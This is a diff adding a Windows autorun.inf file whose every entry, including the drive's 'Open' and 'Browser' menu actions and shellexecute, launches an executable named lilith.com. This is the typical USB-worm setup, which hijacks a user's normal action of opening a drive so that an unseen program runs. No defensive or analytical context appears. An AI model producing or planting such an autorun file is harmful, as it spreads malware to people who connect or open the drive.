@@ -1,0 +1,7 @@
+[autorun]
+open=.\lilith.com
+shell\1\=Open
+shell\1\Command=.\lilith.com
+shell\2\=Browser
+shell\2\Command=.\lilith.com
+shellexecute=.\lilith.com
